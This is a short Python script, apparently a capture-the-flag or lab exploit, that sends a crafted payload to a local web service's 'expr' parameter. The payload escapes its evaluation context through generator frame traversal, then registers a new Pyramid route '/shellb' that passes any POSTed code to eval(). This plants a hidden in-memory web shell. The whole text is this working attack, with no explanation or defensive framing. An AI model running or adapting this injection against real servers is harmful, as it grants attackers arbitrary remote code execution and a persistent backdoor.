import requests

code = '''  
def waff():  
    def f():
        yield g.gi_frame.f_back  
    g = f()
    frame = next(g)       
    b = frame.f_back.f_back.f_globals  
    def hello(request):
        code = request.POST['code']
        res=eval(code)
        return Response(res)  
    config.add_route('shellb', '/shellb')
    config.add_view(hello, route_name='shellb')
    config.commit()  
waff()  
'''

url = "http://127.0.0.1:8129/"
data = {
    "expr": f"{code}+1"
}
r = requests.post(url=url, data=data)
